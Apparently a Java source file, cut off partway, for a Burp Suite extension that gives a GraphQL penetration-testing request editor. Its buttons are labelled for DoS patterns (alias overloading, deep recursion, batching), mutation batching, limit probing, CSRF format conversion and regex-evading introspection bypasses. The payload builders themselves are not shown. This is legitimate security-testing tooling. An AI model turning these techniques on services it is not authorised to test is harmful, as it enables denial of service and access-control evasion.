package com.grip.graphql.editor;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.ui.Selection;
import burp.api.montoya.ui.editor.extension.EditorCreationContext;
import burp.api.montoya.ui.editor.extension.ExtensionProvidedHttpRequestEditor;
import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.grip.graphql.GripCore;
import com.grip.graphql.ui.GripTheme;

import javax.swing.*;
import javax.swing.Box;
import javax.swing.BoxLayout;
import java.awt.*;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class GripRequestEditor implements ExtensionProvidedHttpRequestEditor {

    private final MontoyaApi api;
    private final GripCore core;
    private final GripTheme theme;

    private JPanel mainPanel;
    private JTextArea queryArea;
    private JLabel statusLabel;
    private HttpRequest currentRequest;
    private String originalQuery;
    private String originalRequestBody;
    private String currentAttackMode = "query";

    private String extractedFieldName = "__typename";
    private String extractedTypeName = "Query";
    private String extractedFieldCall = null;
    private String extractedOperationType = "query";
    private String extractedMutationName = null;

    private JSpinner aliasCountSpinner;
    private JSpinner batchCountSpinner;
    private JSpinner fieldDupCountSpinner;
    private JSpinner directiveCountSpinner;
    private JSpinner depthCountSpinner;
    private JSpinner fragmentCountSpinner;

    private int aliasCount = 100;
    private int batchCount = 10;
    private int fieldDupCount = 500;
    private int directiveCount = 50;
    private int depthCount = 10;
    private int fragmentCount = 50;

    private static final Gson PRETTY_GSON = new GsonBuilder()
            .setPrettyPrinting()
            .disableHtmlEscaping()
            .create();

    public GripRequestEditor(MontoyaApi api, GripCore core, EditorCreationContext context) {
        this.api = api;
        this.core = core;
        this.theme = core.getTheme();
        loadConfigFromPrefs();
        initializeUI();
    }

    private void loadConfigFromPrefs() {

        Integer saved;
        saved = core.getConfig().getInteger("grip.attack.aliases");
        if (saved != null) aliasCount = saved;

        saved = core.getConfig().getInteger("grip.attack.batch");
        if (saved != null) batchCount = saved;

        saved = core.getConfig().getInteger("grip.attack.fields");
        if (saved != null) fieldDupCount = saved;

        saved = core.getConfig().getInteger("grip.attack.directives");
        if (saved != null) directiveCount = saved;

        saved = core.getConfig().getInteger("grip.attack.depth");
        if (saved != null) depthCount = saved;

        saved = core.getConfig().getInteger("grip.attack.fragments");
        if (saved != null) fragmentCount = saved;
    }

    private void initializeUI() {
        mainPanel = new JPanel(new BorderLayout(5, 5));
        mainPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

        JPanel headerPanel = new JPanel(new BorderLayout(10, 5));
        headerPanel.setBorder(BorderFactory.createEmptyBorder(0, 0, 10, 0));

        JLabel titleLabel = new JLabel("GraphQL Grip");
        titleLabel.setFont(theme.getFont(Font.BOLD, 16));
        titleLabel.setForeground(GripTheme.Colors.ACCENT);

        JPanel headerButtons = new JPanel(new FlowLayout(FlowLayout.RIGHT, 5, 0));
        JButton saveAllBtn = new JButton("Save All");
        saveAllBtn.setBackground(GripTheme.Colors.ACCENT);
        saveAllBtn.setForeground(Color.WHITE);
        saveAllBtn.setOpaque(true);
        saveAllBtn.setBorderPainted(false);
        saveAllBtn.setFocusPainted(false);
        saveAllBtn.addActionListener(e -> {
            saveConfigToPrefs();
            statusLabel.setText("Settings saved to Burp preferences!");
        });

        JButton resetAllBtn = new JButton("Reset All");
        resetAllBtn.addActionListener(e -> {
            resetConfigToDefaults();
            statusLabel.setText("Settings reset to defaults");
        });

        headerButtons.add(saveAllBtn);
        headerButtons.add(resetAllBtn);

        statusLabel = new JLabel("Select an attack pattern to modify the request");
        statusLabel.setFont(theme.getNormalFont());

        JPanel titleRow = new JPanel(new BorderLayout());
        titleRow.add(titleLabel, BorderLayout.WEST);
        titleRow.add(headerButtons, BorderLayout.EAST);

        headerPanel.add(titleRow, BorderLayout.NORTH);
        headerPanel.add(new JSeparator(), BorderLayout.CENTER);
        headerPanel.add(statusLabel, BorderLayout.SOUTH);

        JTabbedPane attackTabs = new JTabbedPane();
        attackTabs.setFont(theme.getNormalFont());

        attackTabs.addTab("DoS Attacks", createDosPanel());
        attackTabs.addTab("Mutations", createMutationsPanel());
        attackTabs.addTab("Limits Probing", createLimitsPanel());
        attackTabs.addTab("Directives", createDirectivesPanel());
        attackTabs.addTab("Info Disclosure", createInfoPanel());

        queryArea = new JTextArea();
        queryArea.setFont(theme.getCodeFont());
        queryArea.setLineWrap(true);
        queryArea.setWrapStyleWord(true);
        queryArea.setRows(10);

        JScrollPane queryScroll = new JScrollPane(queryArea);
        queryScroll.setBorder(BorderFactory.createTitledBorder("Modified Request Body (editable)"));
        queryScroll.setMinimumSize(new Dimension(100, 150));
        queryScroll.setPreferredSize(new Dimension(400, 200));

        JPanel utilPanel = new JPanel(new FlowLayout(FlowLayout.LEFT, 5, 5));

        JButton copyBtn = new JButton("Copy to Clipboard");
        copyBtn.addActionListener(e -> {
            queryArea.selectAll();
            queryArea.copy();
            statusLabel.setText("Copied to clipboard!");
        });

        JButton resetBtn = new JButton("Reset to Original");
        resetBtn.addActionListener(e -> {
            if (originalRequestBody != null) {
                try {
                    JsonObject parsed = JsonParser.parseString(originalRequestBody).getAsJsonObject();
                    queryArea.setText(PRETTY_GSON.toJson(parsed));
                } catch (Exception ex) {
                    queryArea.setText(originalRequestBody);
                }
                currentAttackMode = "query";
                statusLabel.setText("Reset to original request");
            }
        });

        utilPanel.add(copyBtn);
        utilPanel.add(resetBtn);

        JPanel topPanel = new JPanel(new BorderLayout(5, 5));
        topPanel.add(headerPanel, BorderLayout.NORTH);
        topPanel.add(attackTabs, BorderLayout.CENTER);
        topPanel.setMinimumSize(new Dimension(100, 200));

        JSplitPane splitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT, topPanel, queryScroll);
        splitPane.setResizeWeight(0.35);
        splitPane.setDividerLocation(300);
        splitPane.setOneTouchExpandable(true);

        mainPanel.add(splitPane, BorderLayout.CENTER);
        mainPanel.add(utilPanel, BorderLayout.SOUTH);

        api.userInterface().applyThemeToComponent(mainPanel);
    }

    private JPanel createSpinnerRow(String label, JSpinner spinner) {
        JPanel row = new JPanel(new FlowLayout(FlowLayout.LEFT, 5, 0));
        JLabel lbl = new JLabel(label);
        lbl.setFont(theme.getNormalFont());
        row.add(lbl);
        row.add(spinner);
        return row;
    }

    private void saveConfigToPrefs() {

        core.getConfig().setInteger("grip.attack.aliases", aliasCount);
        core.getConfig().setInteger("grip.attack.batch", batchCount);
        core.getConfig().setInteger("grip.attack.fields", fieldDupCount);
        core.getConfig().setInteger("grip.attack.directives", directiveCount);
        core.getConfig().setInteger("grip.attack.depth", depthCount);
        core.getConfig().setInteger("grip.attack.fragments", fragmentCount);
        statusLabel.setText("Config saved!");
    }

    private void resetConfigToDefaults() {

        aliasCount = 100;
        batchCount = 10;
        fieldDupCount = 500;
        directiveCount = 50;
        depthCount = 10;
        fragmentCount = 50;

        if (aliasCountSpinner != null) aliasCountSpinner.setValue(aliasCount);
        if (batchCountSpinner != null) batchCountSpinner.setValue(batchCount);
        if (fieldDupCountSpinner != null) fieldDupCountSpinner.setValue(fieldDupCount);
        if (directiveCountSpinner != null) directiveCountSpinner.setValue(directiveCount);
        if (depthCountSpinner != null) depthCountSpinner.setValue(depthCount);
        if (fragmentCountSpinner != null) fragmentCountSpinner.setValue(fragmentCount);

        statusLabel.setText("Config reset to defaults");
    }

    private JPanel createDosPanel() {
        JPanel mainPanel = new JPanel();
        mainPanel.setLayout(new BoxLayout(mainPanel, BoxLayout.Y_AXIS));
        mainPanel.setBorder(BorderFactory.createEmptyBorder(GripTheme.SPACING_MD, GripTheme.SPACING_MD, GripTheme.SPACING_MD, GripTheme.SPACING_MD));

        JPanel aliasSection = new JPanel(new BorderLayout(5, 5));
        aliasSection.setBorder(BorderFactory.createTitledBorder("Alias/Width Attacks"));
        aliasSection.setAlignmentX(Component.LEFT_ALIGNMENT);

        aliasCountSpinner = new JSpinner(new SpinnerNumberModel(aliasCount, 10, 10000, 50));
        aliasCountSpinner.addChangeListener(e -> aliasCount = (Integer) aliasCountSpinner.getValue());
        JPanel aliasSpinnerRow = createSpinnerRow("Aliases:", aliasCountSpinner);

        JPanel aliasButtons = new JPanel(new GridLayout(1, 2, 5, 5));
        addAttackButton(aliasButtons, "Alias Overloading", "N aliased copies of field", e -> applyAliasOverloading());
        addAttackButton(aliasButtons, "Width Attack", "N different __type queries", e -> applyWidthAttack());

        aliasSection.add(aliasSpinnerRow, BorderLayout.NORTH);
        aliasSection.add(aliasButtons, BorderLayout.CENTER);
        aliasSection.setMaximumSize(new Dimension(Integer.MAX_VALUE, 80));
        mainPanel.add(aliasSection);
        mainPanel.add(Box.createVerticalStrut(GripTheme.SPACING_SM));

        JPanel fieldSection = new JPanel(new BorderLayout(5, 5));
        fieldSection.setBorder(BorderFactory.createTitledBorder("Field Duplication"));
        fieldSection.setAlignmentX(Component.LEFT_ALIGNMENT);

        fieldDupCountSpinner = new JSpinner(new SpinnerNumberModel(fieldDupCount, 50, 10000, 100));
        fieldDupCountSpinner.addChangeListener(e -> fieldDupCount = (Integer) fieldDupCountSpinner.getValue());
        JPanel fieldSpinnerRow = createSpinnerRow("Fields:", fieldDupCountSpinner);

        JPanel fieldButtons = new JPanel(new GridLayout(1, 1, 5, 5));
        addAttackButton(fieldButtons, "Field Duplication", "N aliased fields (each = separate resolution)", e -> applyFieldDuplication());

        fieldSection.add(fieldSpinnerRow, BorderLayout.NORTH);
        fieldSection.add(fieldButtons, BorderLayout.CENTER);
        fieldSection.setMaximumSize(new Dimension(Integer.MAX_VALUE, 80));
        mainPanel.add(fieldSection);
        mainPanel.add(Box.createVerticalStrut(GripTheme.SPACING_SM));

        JPanel depthSection = new JPanel(new BorderLayout(5, 5));
        depthSection.setBorder(BorderFactory.createTitledBorder("Depth Attacks"));
        depthSection.setAlignmentX(Component.LEFT_ALIGNMENT);

        depthCountSpinner = new JSpinner(new SpinnerNumberModel(depthCount, 3, 100, 5));
        depthCountSpinner.addChangeListener(e -> depthCount = (Integer) depthCountSpinner.getValue());
        JPanel depthSpinnerRow = createSpinnerRow("Depth:", depthCountSpinner);

        JPanel depthButtons = new JPanel(new GridLayout(1, 2, 5, 5));
        addAttackButton(depthButtons, "Deep Recursion", "N-level nested query", e -> applyDeepRecursion());
        addAttackButton(depthButtons, "Circular Introspection", "N-level nested introspection", e -> applyCircularIntrospection());

        depthSection.add(depthSpinnerRow, BorderLayout.NORTH);
        depthSection.add(depthButtons, BorderLayout.CENTER);
        depthSection.setMaximumSize(new Dimension(Integer.MAX_VALUE, 80));
        mainPanel.add(depthSection);
        mainPanel.add(Box.createVerticalStrut(GripTheme.SPACING_SM));

        JPanel fragSection = new JPanel(new BorderLayout(5, 5));
        fragSection.setBorder(BorderFactory.createTitledBorder("Fragment Overloading"));
        fragSection.setAlignmentX(Component.LEFT_ALIGNMENT);

        fragmentCountSpinner = new JSpinner(new SpinnerNumberModel(fragmentCount, 10, 500, 10));
        fragmentCountSpinner.addChangeListener(e -> fragmentCount = (Integer) fragmentCountSpinner.getValue());
        JPanel fragSpinnerRow = createSpinnerRow("Fragments:", fragmentCountSpinner);

        JPanel fragButtons = new JPanel(new GridLayout(1, 1, 5, 5));
        addAttackButton(fragButtons, "Fragment Overloading", "N unique fragment spreads", e -> applyFragmentOverloading());

        fragSection.add(fragSpinnerRow, BorderLayout.NORTH);
        fragSection.add(fragButtons, BorderLayout.CENTER);
        fragSection.setMaximumSize(new Dimension(Integer.MAX_VALUE, 80));
        mainPanel.add(fragSection);
        mainPanel.add(Box.createVerticalStrut(GripTheme.SPACING_SM));

        JPanel batchSection = new JPanel(new BorderLayout(5, 5));
        batchSection.setBorder(BorderFactory.createTitledBorder("Batching Attacks"));
        batchSection.setAlignmentX(Component.LEFT_ALIGNMENT);

        batchCountSpinner = new JSpinner(new SpinnerNumberModel(batchCount, 2, 1000, 5));
        batchCountSpinner.addChangeListener(e -> batchCount = (Integer) batchCountSpinner.getValue());
        JPanel batchSpinnerRow = createSpinnerRow("Batch Size:", batchCountSpinner);

        JPanel batchButtons = new JPanel(new GridLayout(2, 2, 5, 5));
        addAttackButton(batchButtons, "Simple Batch", "N identical queries in array", e -> applyBatchQuery());
        addAttackButton(batchButtons, "Mixed Batch", "Query + introspection alternating", e -> applyMixedBatch());
        addAttackButton(batchButtons, "Incremental Batch", "Test batch size limits", e -> applyIncrementalBatch());
        addAttackButton(batchButtons, "Batch with Vars", "N queries with unique operationName", e -> applyBatchWithVariables());

        batchSection.add(batchSpinnerRow, BorderLayout.NORTH);
        batchSection.add(batchButtons, BorderLayout.CENTER);
        batchSection.setMaximumSize(new Dimension(Integer.MAX_VALUE, 100));
        mainPanel.add(batchSection);

        mainPanel.add(Box.createVerticalGlue());

        JScrollPane scrollPane = new JScrollPane(mainPanel);
        scrollPane.setBorder(null);
        scrollPane.getVerticalScrollBar().setUnitIncrement(16);

        JPanel panel = new JPanel(new BorderLayout());
        panel.add(scrollPane, BorderLayout.CENTER);

        return panel;
    }

    private JPanel createMutationsPanel() {
        JPanel mainPanel = new JPanel();
        mainPanel.setLayout(new BoxLayout(mainPanel, BoxLayout.Y_AXIS));
        mainPanel.setBorder(BorderFactory.createEmptyBorder(GripTheme.SPACING_MD, GripTheme.SPACING_MD, GripTheme.SPACING_MD, GripTheme.SPACING_MD));

        JLabel warningLabel = new JLabel("\u26A0\uFE0F WARNING: Mutations modify data! Review before sending.");
        warningLabel.setForeground(GripTheme.Colors.WARNING);
        warningLabel.setFont(theme.getFont(Font.BOLD, 12));
        warningLabel.setAlignmentX(Component.LEFT_ALIGNMENT);
        mainPanel.add(warningLabel);
        mainPanel.add(Box.createVerticalStrut(GripTheme.SPACING_SM));

        JPanel aliasSection = new JPanel(new BorderLayout(5, 5));
        aliasSection.setBorder(BorderFactory.createTitledBorder("Aliased Mutations"));
        aliasSection.setAlignmentX(Component.LEFT_ALIGNMENT);

        JPanel aliasInfo = new JPanel(new FlowLayout(FlowLayout.LEFT, 5, 0));
        aliasInfo.add(new JLabel("Uses Aliases spinner from DoS tab"));

        JPanel aliasButtons = new JPanel(new GridLayout(1, 1, 5, 5));
        addAttackButton(aliasButtons, "Aliased Mutations", "mutation { m0: field, m1: field... }", e -> applyAliasedMutations());

        aliasSection.add(aliasInfo, BorderLayout.NORTH);
        aliasSection.add(aliasButtons, BorderLayout.CENTER);
        aliasSection.setMaximumSize(new Dimension(Integer.MAX_VALUE, 70));
        mainPanel.add(aliasSection);
        mainPanel.add(Box.createVerticalStrut(GripTheme.SPACING_SM));

        JPanel batchSection = new JPanel(new BorderLayout(5, 5));
        batchSection.setBorder(BorderFactory.createTitledBorder("Batch Mutations"));
        batchSection.setAlignmentX(Component.LEFT_ALIGNMENT);

        JPanel batchInfo = new JPanel(new FlowLayout(FlowLayout.LEFT, 5, 0));
        batchInfo.add(new JLabel("Uses Batch spinner from DoS tab"));

        JPanel batchButtons = new JPanel(new GridLayout(1, 2, 5, 5));
        addAttackButton(batchButtons, "Batch Mutations", "[{mutation}, {mutation}...] array", e -> applyBatchMutations());
        addAttackButton(batchButtons, "Mixed Batch", "Mutations + queries interleaved", e -> applyMixedMutationBatch());

        batchSection.add(batchInfo, BorderLayout.NORTH);
        batchSection.add(batchButtons, BorderLayout.CENTER);
        batchSection.setMaximumSize(new Dimension(Integer.MAX_VALUE, 70));
        mainPanel.add(batchSection);
        mainPanel.add(Box.createVerticalStrut(GripTheme.SPACING_SM));

        JPanel fragSection = new JPanel(new BorderLayout(5, 5));
        fragSection.setBorder(BorderFactory.createTitledBorder("Mutation Fragments"));
        fragSection.setAlignmentX(Component.LEFT_ALIGNMENT);

        JPanel fragInfo = new JPanel(new FlowLayout(FlowLayout.LEFT, 5, 0));
        fragInfo.add(new JLabel("Uses Fragments spinner from DoS tab"));

        JPanel fragButtons = new JPanel(new GridLayout(1, 1, 5, 5));
        addAttackButton(fragButtons, "Mutation Fragments", "fragment MF0..MFn on Mutation { __typename }", e -> applyMutationFragments());

        fragSection.add(fragInfo, BorderLayout.NORTH);
        fragSection.add(fragButtons, BorderLayout.CENTER);
        fragSection.setMaximumSize(new Dimension(Integer.MAX_VALUE, 70));
        mainPanel.add(fragSection);

        mainPanel.add(Box.createVerticalGlue());

        JPanel panel = new JPanel(new BorderLayout());
        panel.add(mainPanel, BorderLayout.NORTH);

        return panel;
    }

    private JPanel createLimitsPanel() {
        JPanel mainPanel = new JPanel();
        mainPanel.setLayout(new BoxLayout(mainPanel, BoxLayout.Y_AXIS));
        mainPanel.setBorder(BorderFactory.createEmptyBorder(GripTheme.SPACING_LG, GripTheme.SPACING_LG, GripTheme.SPACING_LG, GripTheme.SPACING_LG));

        mainPanel.add(createCategoryLabel("Depth Limit Probing"));
        mainPanel.add(Box.createVerticalStrut(GripTheme.SPACING_SM));

        JPanel depthPanel = new JPanel(new GridLayout(0, 2, GripTheme.SPACING_SM, GripTheme.SPACING_SM));
        depthPanel.setAlignmentX(Component.LEFT_ALIGNMENT);

        addAttackButton(depthPanel, "Depth 5",
            "Query with depth 5 - baseline test",
            e -> applyDepthProbe(5));

        addAttackButton(depthPanel, "Depth 10",
            "Query with depth 10",
            e -> applyDepthProbe(10));

        addAttackButton(depthPanel, "Depth 20",
            "Query with depth 20",
            e -> applyDepthProbe(20));

        addAttackButton(depthPanel, "Depth 50",
            "Query with depth 50 - stress test",
            e -> applyDepthProbe(50));

        depthPanel.setMaximumSize(new Dimension(Integer.MAX_VALUE, depthPanel.getPreferredSize().height + 20));
        mainPanel.add(depthPanel);
        mainPanel.add(Box.createVerticalStrut(GripTheme.SPACING_XL));

        mainPanel.add(createCategoryLabel("Width Limit Probing"));
        mainPanel.add(Box.createVerticalStrut(GripTheme.SPACING_SM));

        JPanel widthPanel = new JPanel(new GridLayout(0, 2, GripTheme.SPACING_SM, GripTheme.SPACING_SM));
        widthPanel.setAlignmentX(Component.LEFT_ALIGNMENT);

        addAttackButton(widthPanel, "Width 50",
            "Query with 50 aliases - baseline",
            e -> applyWidthProbe(50));

        addAttackButton(widthPanel, "Width 100",
            "Query with 100 aliases",
            e -> applyWidthProbe(100));

        addAttackButton(widthPanel, "Width 500",
            "Query with 500 aliases",
            e -> applyWidthProbe(500));

        addAttackButton(widthPanel, "Width 1000",
            "Query with 1000 aliases - stress test",
            e -> applyWidthProbe(1000));

        widthPanel.setMaximumSize(new Dimension(Integer.MAX_VALUE, widthPanel.getPreferredSize().height + 20));
        mainPanel.add(widthPanel);
        mainPanel.add(Box.createVerticalStrut(GripTheme.SPACING_XL));

        mainPanel.add(createCategoryLabel("Batch Size Probing"));
        mainPanel.add(Box.createVerticalStrut(GripTheme.SPACING_SM));

        JPanel batchProbePanel = new JPanel(new GridLayout(0, 2, GripTheme.SPACING_SM, GripTheme.SPACING_SM));
        batchProbePanel.setAlignmentX(Component.LEFT_ALIGNMENT);

        addAttackButton(batchProbePanel, "Batch 5",
            "Array batch with 5 queries",
            e -> applyBatchProbe(5));

        addAttackButton(batchProbePanel, "Batch 20",
            "Array batch with 20 queries",
            e -> applyBatchProbe(20));

        addAttackButton(batchProbePanel, "Batch 50",
            "Array batch with 50 queries",
            e -> applyBatchProbe(50));

        addAttackButton(batchProbePanel, "Batch 100",
            "Array batch with 100 queries - stress test",
            e -> applyBatchProbe(100));

        batchProbePanel.setMaximumSize(new Dimension(Integer.MAX_VALUE, batchProbePanel.getPreferredSize().height + 20));
        mainPanel.add(batchProbePanel);

        JScrollPane scrollPane = new JScrollPane(mainPanel);
        scrollPane.setBorder(null);
        scrollPane.getVerticalScrollBar().setUnitIncrement(16);

        JPanel panel = new JPanel(new BorderLayout());
        panel.add(scrollPane, BorderLayout.CENTER);

        return panel;
    }

    private JPanel createDirectivesPanel() {
        JPanel mainPanel = new JPanel();
        mainPanel.setLayout(new BoxLayout(mainPanel, BoxLayout.Y_AXIS));
        mainPanel.setBorder(BorderFactory.createEmptyBorder(GripTheme.SPACING_MD, GripTheme.SPACING_MD, GripTheme.SPACING_MD, GripTheme.SPACING_MD));

        JPanel overloadSection = new JPanel(new BorderLayout(5, 5));
        overloadSection.setBorder(BorderFactory.createTitledBorder("Directive Overloading"));
        overloadSection.setAlignmentX(Component.LEFT_ALIGNMENT);

        directiveCountSpinner = new JSpinner(new SpinnerNumberModel(directiveCount, 10, 500, 10));
        directiveCountSpinner.addChangeListener(e -> directiveCount = (Integer) directiveCountSpinner.getValue());
        JPanel dirSpinnerRow = createSpinnerRow("Directives:", directiveCountSpinner);

        JPanel overloadButtons = new JPanel(new GridLayout(1, 3, 5, 5));
        addAttackButton(overloadButtons, "@include Overload", "field @include(if:true)...", e -> applyDirectiveOverloading("include"));
        addAttackButton(overloadButtons, "@skip Overload", "field @skip(if:false)...", e -> applyDirectiveOverloading("skip"));
        addAttackButton(overloadButtons, "Mixed Directives", "@include/@skip alternating", e -> applyMixedDirectives());

        overloadSection.add(dirSpinnerRow, BorderLayout.NORTH);
        overloadSection.add(overloadButtons, BorderLayout.CENTER);
        overloadSection.setMaximumSize(new Dimension(Integer.MAX_VALUE, 80));
        mainPanel.add(overloadSection);
        mainPanel.add(Box.createVerticalStrut(GripTheme.SPACING_SM));

        JPanel detectSection = new JPanel(new BorderLayout(5, 5));
        detectSection.setBorder(BorderFactory.createTitledBorder("Directive Detection (fixed payloads)"));
        detectSection.setAlignmentX(Component.LEFT_ALIGNMENT);

        JPanel detectButtons = new JPanel(new GridLayout(1, 3, 5, 5));
        addAttackButton(detectButtons, "@defer Test", "Test incremental delivery", e -> applyDeferTest());
        addAttackButton(detectButtons, "@stream Test", "Test streaming support", e -> applyStreamTest());
        addAttackButton(detectButtons, "Discovery", "List all directives", e -> applyDirectiveDiscovery());

        detectSection.add(detectButtons, BorderLayout.CENTER);
        detectSection.setMaximumSize(new Dimension(Integer.MAX_VALUE, 60));
        mainPanel.add(detectSection);
        mainPanel.add(Box.createVerticalStrut(GripTheme.SPACING_SM));

        JPanel opNameSection = new JPanel(new BorderLayout(5, 5));
        opNameSection.setBorder(BorderFactory.createTitledBorder("Operation Name Testing (fixed payloads)"));
        opNameSection.setAlignmentX(Component.LEFT_ALIGNMENT);

        JPanel opNameButtons = new JPanel(new GridLayout(1, 4, 5, 5));
        addAttackButton(opNameButtons, "Long Name", "1000 char operation name", e -> applyLongOperationName());
        addAttackButton(opNameButtons, "Special Chars", "Underscores at edges", e -> applySpecialCharsOperationName());
        addAttackButton(opNameButtons, "Unicode", "éèê characters", e -> applyUnicodeOperationName());
        addAttackButton(opNameButtons, "Reserved", "'query' as op name", e -> applyReservedWordsOperationName());

        opNameSection.add(opNameButtons, BorderLayout.CENTER);
        opNameSection.setMaximumSize(new Dimension(Integer.MAX_VALUE, 60));
        mainPanel.add(opNameSection);
        mainPanel.add(Box.createVerticalStrut(GripTheme.SPACING_SM));

        JPanel csrfSection = new JPanel(new BorderLayout(5, 5));
        csrfSection.setBorder(BorderFactory.createTitledBorder("Request Format / CSRF"));
        csrfSection.setAlignmentX(Component.LEFT_ALIGNMENT);

        JPanel csrfButtons = new JPanel(new GridLayout(1, 4, 5, 5));
        addAttackButton(csrfButtons, "GET Method", "Query as URL param", e -> convertToGet());
        addAttackButton(csrfButtons, "URL-Encoded", "x-www-form-urlencoded", e -> convertToUrlEncoded());
        addAttackButton(csrfButtons, "Multipart", "multipart/form-data", e -> convertToMultipart());
        addAttackButton(csrfButtons, "APQ Hash", "SHA256 persisted query", e -> applyPersistedQueryHash());

        csrfSection.add(csrfButtons, BorderLayout.CENTER);
        csrfSection.setMaximumSize(new Dimension(Integer.MAX_VALUE, 60));
        mainPanel.add(csrfSection);

        mainPanel.add(Box.createVerticalGlue());

        JScrollPane scrollPane = new JScrollPane(mainPanel);
        scrollPane.setBorder(null);
        scrollPane.getVerticalScrollBar().setUnitIncrement(16);

        JPanel panel = new JPanel(new BorderLayout());
        panel.add(scrollPane, BorderLayout.CENTER);

        return panel;
    }

    private JPanel createInfoPanel() {
        JPanel mainPanel = new JPanel();
        mainPanel.setLayout(new BoxLayout(mainPanel, BoxLayout.Y_AXIS));
        mainPanel.setBorder(BorderFactory.createEmptyBorder(GripTheme.SPACING_LG, GripTheme.SPACING_LG, GripTheme.SPACING_LG, GripTheme.SPACING_LG));

        mainPanel.add(createCategoryLabel("Schema Discovery"));
        mainPanel.add(Box.createVerticalStrut(GripTheme.SPACING_SM));

        JPanel discoveryPanel = new JPanel(new GridLayout(0, 2, GripTheme.SPACING_SM, GripTheme.SPACING_SM));
        discoveryPanel.setAlignmentX(Component.LEFT_ALIGNMENT);

        addAttackButton(discoveryPanel, "Full Introspection",
            "Complete introspection query",
            e -> applyFullIntrospection());

        addAttackButton(discoveryPanel, "Field Suggestion",
            "Trigger 'Did you mean?' errors",
            e -> applyFieldSuggestionProbe());

        addAttackButton(discoveryPanel, "Type Enumeration",
            "Query common type names",
            e -> applyTypeEnumeration());

        addAttackButton(discoveryPanel, "__typename Probe",
            "Basic __typename query",
            e -> applyTypenameProbe());

        discoveryPanel.setMaximumSize(new Dimension(Integer.MAX_VALUE, discoveryPanel.getPreferredSize().height + 20));
        mainPanel.add(discoveryPanel);
        mainPanel.add(Box.createVerticalStrut(GripTheme.SPACING_XL));

        mainPanel.add(createCategoryLabel("Introspection Bypasses"));
        mainPanel.add(Box.createVerticalStrut(GripTheme.SPACING_SM));

        JPanel bypassPanel = new JPanel(new GridLayout(0, 2, GripTheme.SPACING_SM, GripTheme.SPACING_SM));
        bypassPanel.setAlignmentX(Component.LEFT_ALIGNMENT);

        addAttackButton(bypassPanel, "__type Bypass",
            "Uses __type(name:\"Query\") instead of __schema",
            e -> applyIntrospectionBypass());

        addAttackButton(bypassPanel, "Newline Injection",
            "Newline after __schema to bypass regex",
            e -> applyBypassNewline());

        addAttackButton(bypassPanel, "Tab Injection",
            "Tab characters to bypass regex",
            e -> applyBypassTab());

        addAttackButton(bypassPanel, "CRLF Bypass",
            "Windows-style line endings",
            e -> applyBypassCRLF());

        addAttackButton(bypassPanel, "Fragment Bypass",
            "Using fragments to access __schema",
            e -> applyBypassFragment());

        addAttackButton(bypassPanel, "Inline Fragment",
            "Inline fragment wrapper",
            e -> applyBypassInlineFragment());

        addAttackButton(bypassPanel, "Aliased __schema",
            "Alias the __schema query",
            e -> applyBypassAlias());

        addAttackButton(bypassPanel, "Batched Bypass",
            "Introspection in batch array",
            e -> applyBypassBatch());

        addAttackButton(bypassPanel, "@include Bypass",
            "Conditional with @include directive",
            e -> applyBypassIncludeDirective());

        addAttackButton(bypassPanel, "@skip Bypass",
            "Conditional with @skip directive",
            e -> applyBypassSkipDirective());

        addAttackButton(bypassPanel, "Long OpName",
            "Long operation name to overflow buffer",
            e -> applyBypassLongOpName());

        addAttackButton(bypassPanel, "GET Method",
            "Send introspection via GET",
            e -> applyBypassGetMethod());

        bypassPanel.setMaximumSize(new Dimension(Integer.MAX_VALUE, bypassPanel.getPreferredSize().height + 20));
        mainPanel.add(bypassPanel);
        mainPanel.add(Box.createVerticalStrut(GripTheme.SPACING_XL));

        mainPanel.add(createCategoryLabel("Debug & Tracing"));
        mainPanel.add(Box.createVerticalStrut(GripTheme.SPACING_SM));

        JPanel debugPanel = new JPanel(new GridLayout(0, 2, GripTheme.SPACING_SM, GripTheme.SPACING_SM));
        debugPanel.setAlignmentX(Component.LEFT_ALIGNMENT);

        addAttackButton(debugPanel, "Enable Tracing",
            "Adds extensions.tracing=true",
            e -> applyTracing());

        addAttackButton(debugPanel, "Enable Debug Mode",
            "Adds debug/verbose/stackTrace flags",
            e -> applyDebugMode());

        addAttackButton(debugPanel, "Trigger Verbose Errors",
            "Sends invalid query to expose error details",
            e -> applyErrorTrigger());

        addAttackButton(debugPanel, "Engine Fingerprint",
            "Queries schema to identify GraphQL engine",
            e -> applyFingerprint());

        debugPanel.setMaximumSize(new Dimension(Integer.MAX_VALUE, debugPanel.getPreferredSize().height + 20));
        mainPanel.add(debugPanel);

        JScrollPane scrollPane = new JScrollPane(mainPanel);
        scrollPane.setBorder(null);
        scrollPane.getVerticalScrollBar().setUnitIncrement(16);

        JPanel panel = new JPanel(new BorderLayout());
        panel.add(scrollPane, BorderLayout.CENTER);

        return panel;
    }

    private JLabel createCategoryLabel(String text) {
        JLabel label = new JLabel(text, SwingConstants.CENTER);
        label.setFont(theme.getFont(Font.BOLD, GripTheme.FONT_SIZE_NORMAL));
        label.setForeground(GripTheme.Colors.ACCENT);
        label.setBorder(BorderFactory.createCompoundBorder(
            BorderFactory.createMatteBorder(0, 0, 2, 0, GripTheme.Colors.ACCENT),
            BorderFactory.createEmptyBorder(GripTheme.SPACING_SM, GripTheme.SPACING_MD, GripTheme.SPACING_SM, GripTheme.SPACING_MD)
        ));
        label.setAlignmentX(Component.LEFT_ALIGNMENT);
        label.setHorizontalAlignment(SwingConstants.CENTER);
        Dimension size = new Dimension(Integer.MAX_VALUE, 32);
        label.setMaximumSize(size);
        label.setPreferredSize(new Dimension(400, 32));
        return label;
    }

    private void addAttackButton(JPanel panel, String name, String description, java.awt.event.ActionListener action) {
        JButton btn = new JButton(name);
        btn.setFont(theme.getNormalFont());
        btn.setFocusPainted(false);
        btn.setCursor(new Cursor(Cursor.HAND_CURSOR));
        btn.setToolTipText("<html><div style='padding:4px;'><b>" + name + "</b><br>" + description + "</div></html>");
        btn.setBorder(BorderFactory.createCompoundBorder(
            new GripTheme.RoundedBorder(theme.getBorder(), GripTheme.CORNER_RADIUS_SM, 1),
